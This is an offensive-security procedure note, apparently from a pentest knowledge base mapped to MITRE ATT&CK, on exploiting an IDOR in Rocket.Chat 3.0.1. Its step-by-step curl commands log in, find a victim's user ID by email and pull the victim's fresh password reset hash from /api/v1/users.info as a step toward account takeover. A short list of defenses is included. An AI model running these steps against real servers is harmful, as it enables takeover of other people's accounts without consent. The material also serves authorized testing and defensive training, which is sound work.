---
id: p3c4d5e6-f7g8-9012-cdef-345678901234
tags:
  - idor
  - hash-exposure
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-users-list]]'
  - '[[commands/curl-users-info]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:33:24.543Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Retrieve Password Reset Hash via IDOR

## Summary

After triggering a reset, re-authenticate and use IDOR to query the user's info by email and _id, exposing the freshly generated password reset hash.

## Description

The /api/v1/users.info endpoint lacks checks, allowing retrieval of the reset hash field post-email trigger. Re-list users to match by email and confirm _id, then fetch details. This chains with prior enumeration in Rocket.Chat 3.0.1 web environment.

## Requirements

1. Attacker's credentials for re-auth
2. Target's email to search in user list
3. Recent reset trigger to ensure hash exists

## Defense

Defensive measures and detection strategies:

- Remove sensitive fields like reset hashes from API responses for non-owners
- Implement object-level auth to block cross-user queries
- Audit API logs for repeated users.info calls

## Objectives

1. Locate target's _id post-reset
2. Extract the reset hash
3. Enable takeover in final step

## Instructions

### Step 1: Re-Authenticate

**Context**: Restore session to access protected APIs.

**Command** ([[commands/rocket-chat-login]]):
```bash
curl -X POST https://target/api/v1/login -d '{"user": "attacker@ldap", "password": "pass"}'
```

> Obtain new tokens.

### Step 2: Re-List Users and Find Target

**Context**: Search for target by email to get _id.

**Command** ([[commands/curl-users-list]]):
```bash
curl -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID" https://target/api/v1/users.list | grep "target@example.com"
```

> Parse JSON to copy _id.

### Step 3: Fetch User Info with Hash

**Context**: Retrieve details including the reset hash.

**Command** ([[commands/curl-users-info]]):
```bash
curl -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID" "https://target/api/v1/users.info?userId=TARGET_ID"
```

> JSON includes 'reset' or similar field with hash value.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-users-list]]
- [[commands/curl-users-info]]

## Tools Used


## Tags

- hash-retrieval
- idor-exploit
